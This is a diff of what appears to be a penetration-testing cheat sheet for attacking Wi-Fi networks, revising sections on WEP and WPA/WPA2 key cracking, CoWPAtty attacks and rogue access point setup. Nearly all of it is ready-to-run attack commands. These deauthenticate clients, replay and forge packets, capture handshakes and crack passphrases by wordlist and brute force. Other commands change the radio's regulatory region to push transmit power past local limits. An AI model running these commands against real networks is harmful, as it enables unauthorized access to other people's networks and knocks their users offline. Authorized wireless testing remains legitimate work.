@@ -1,29 +1,30 @@
-﻿WPA2 PSK attack with aircrack-ng suite.
----------------------------------------
+﻿WEP attack with aircrack-ng suite.
+----------------------------------
 
-ifconfig wlan1 # check wireless IFace
-sudo airmon-ng check kill  # kill issue causing processes
-sudo airmon-ng start wlan1 # start monitor mode
-sudo airodump-ng wlan1mon  # start capturing
-sudo airodump-ng --bssid 64:66:B3:6E:B0:8A -c 11 wlan1mon -w output
-sudo aireplay-ng --deauth 5 -a 64:66:B3:6E:B0:8A wlan1mon   # deauthenticate the client
-sudo aircrack-ng output-01.cap dict # crack the passphrase
+airmon-ng start wlan0 <AP Channel>
+airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
+aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
+aireplay-ng -3 -b <AP MAC> -h <Attacker MAC> wlan0mon # ARP Replay
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> wlan0mon
+aircrack-ng -0 <filename.cap>
+
+airmon-ng start wlan0 <AP Channel>
+airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
+aireplay-ng -1 0 -e <AP ESSID> -a <AP MAC> -h <Attacker MAC> wlan0mon
+aireplay-ng -5 -b <AP MAC> -h <Attacker MAC> wlan0mon
+packetforge-ng -0 -a <AP MAC> -h <Attacker MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <packet filename>
+tcpdump -n -vvv -e -s0 -r <packet filename>
+aireplay-ng -2 -r <packet filename> wlan0mon
+aircrack-ng -0 <filename>
 
 
 WPA PSK attack with aircrack-ng suite.
 --------------------------------------
 
-Place your wireless card into Monitor Mode
-airmon-ng start wlan0
-
-Detect all available wireless AP’s and clients
-airodump-ng mon0
-
-Setting adapter channel
-iwconfig mon0 channel <channel_number>
-
-Capturing the four-way handshake
-airodump-ng --channel <channel_number> --bssid <bssid> --write capture mon0
+airmon-ng start wlan0 <AP Channel>
+airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> wlan0mon
+aireplay-ng -0 1 -a <AP MAC> -c <Victim MAC> wlan0mon
+aircrack-ng -0 -w <wordlist> <capture file>
 
 You can capture the handshake passively (it takes time) or de-authenticate a client.
 
@@ -38,27 +39,13 @@ aircrack-ng -w passwords.lst capture-01.cap
 Brute force Attack
 crunch 8 8 0123456789 | aircrack-ng -e "Name of Wireless Network" -w - /root/home/wpa2.eapol.cap
 
+CoWPAtty Attack
+Wordlist mode:
+cowpatty -r <Capture file> -f <wordlist> -2 -s <AP ESSID>
 
-WEP attack with aircrack-ng suite.
-----------------------------------
-
-Place your wireless card into Monitor Mode
-airmon-ng start wlan0
-
-Detect all available wireless AP’s and clients
-airodump-ng mon0
-
-Setting adapter channel
-iwconfig mon0 channel <channel_number>
-
-airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)
-
-aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)
-
-aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)
-
-aircrack-ng -b (bssid) (file name-01.cap)
-
+PMK mode:
+genpmk -f <wordlist> -d <hash filename> -s <AP ESSID>
+cowpatty -r <Capture file> -d <hash filename> -2 -s <AP ESSID>
 
 Rogue Access Point Testing
 --------------------------
@@ -70,12 +57,12 @@ Rogue Access Point Testing
 # airmon-ng start wlan0
 # airodump-ng --write capture mon0
 
-root@backbox:/home/backbox# ifconfig wlan1 down
-root@backbox:/home/backbox# iw reg set BO
-root@backbox:/home/backbox# ifconfig wlan1 up
-root@backbox:/home/backbox# iwconfig wlan1 channel 13
-root@backbox:/home/backbox# iwconfig wlan1 txpower 30
-root@backbox:/home/backbox# iwconfig wlan1 rate 11M auto
+ifconfig wlan1 down
+iw reg set BO
+ifconfig wlan1 up
+iwconfig wlan1 channel 13
+iwconfig wlan1 txpower 30
+iwconfig wlan1 rate 11M auto
 
 
 Reaver
